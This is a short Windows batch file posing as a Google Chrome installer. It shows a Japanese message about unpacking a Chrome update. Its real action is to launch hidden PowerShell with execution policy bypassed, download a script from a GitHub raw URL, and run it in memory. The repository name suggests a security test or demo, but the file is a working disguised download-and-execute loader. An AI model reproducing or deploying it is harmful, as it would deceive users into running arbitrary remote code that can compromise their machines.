@echo off
:: Chrome_Installer.bat
echo Google Chromeの更新ファイルを展開中...
:: GitHubから直接スクリプトを読み込み、メモリ上で実行する
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TakahashiTakumi0331/sec_test_installer/refs/heads/main/demo_payload.ps1')"
exit
